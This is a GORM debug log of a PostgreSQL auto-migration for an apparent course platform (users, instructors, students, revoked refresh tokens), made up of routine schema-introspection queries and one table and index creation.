[0m[33m[1.227ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.857ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.938ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.323ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.318ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'instructors'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.828ms] [34;1m[rows:-][0m SELECT * FROM "instructors" LIMIT 5

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.163ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.519ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.491ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'instructors'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.171ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.036ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.016ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.188ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.157ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'account_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.454ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.959ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND constraint_name = 'fk_instructors_user'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.767ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructors_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.261ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructor_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.828ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.456ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.305ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.597ms] [34;1m[rows:-][0m SELECT * FROM "revoked_refresh_tokens" LIMIT 5

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.402ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'revoked_refresh_tokens' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.795ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'revoked_refresh_tokens'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.485ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'revoked_refresh_tokens'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.031ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.009ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.113ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.048ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.067ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'refresh_token') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.641ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'revoked_refresh_tokens' AND indexname = 'idx_revoked_refresh_tokens_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.510ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_token_instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.480ms] [34;1m[rows:0][0m CREATE TABLE "revoked_refresh_token_instructors" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"instructor_id" bigint,"revoked_refresh_token_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_revoked_refresh_token_instructors_instructor" FOREIGN KEY ("instructor_id") REFERENCES "instructors"("id"),CONSTRAINT "fk_revoked_refresh_token_instructors_revoked_refresh_token" FOREIGN KEY ("revoked_refresh_token_id") REFERENCES "revoked_refresh_tokens"("id"))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.237ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_revoked_refresh_token_instructors_deleted_at" ON "revoked_refresh_token_instructors" ("deleted_at")

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.663ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.311ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.434ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.500ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.324ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[13.847ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.543ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.010ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.042ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.063ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.079ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.114ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.063ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.140ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.040ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.076ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.040ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.039ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.987ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.038ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.165ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.176ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.847ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.407ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.900ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'students'

